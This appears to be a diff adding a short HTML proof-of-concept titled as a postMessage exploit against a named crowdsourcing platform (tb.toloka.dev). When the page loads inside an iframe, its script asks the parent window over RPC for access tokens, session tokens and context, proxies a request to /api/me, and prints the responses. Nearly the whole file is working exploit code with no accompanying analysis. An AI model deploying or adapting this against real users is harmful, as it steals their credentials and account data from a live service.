@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>PoC - Toloka postMessage exploit</title>
+  <style>
+    body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
+    pre { white-space: pre-wrap; word-break: break-word; }
+  </style>
+</head>
+<body>
+  <h2>📡 Exploit Output</h2>
+  <pre id="output">⏳ Waiting for data from parent window...</pre>
+
+  <script>
+    const log = (...args) => {
+      const el = document.getElementById('output');
+      const line = args.map(a =>
+        typeof a === 'object' ? JSON.stringify(a, null, 2) : String(a)
+      ).join(' ');
+      el.textContent += '\n' + line;
+      console.log(...args);
+    };
+
+    function callRPC(method, payload = {}) {
+      const id = crypto.randomUUID();
+      window.addEventListener('message', function listener(e) {
+        if (e.origin !== "https://tb.toloka.dev") return;
+        if (e.data?.id === id && e.data?.type === 'rpc') {
+          log(`✅ ${method}`, e.data.payload);
+          window.removeEventListener('message', listener);
+        }
+      });
+      window.parent.postMessage({ type: 'rpc', id, name: method, payload }, '*');
+      log(`📤 Sent ${method}`, { id, payload });
+    }
+
+    window.onload = () => {
+      ['getAccessToken', 'getToken', 'getContext'].forEach(method => callRPC(method));
+      callRPC('fetch', { url: '/api/me', requestInit: { method: 'GET' } });
+    };
+  </script>
+</body>
+</html>
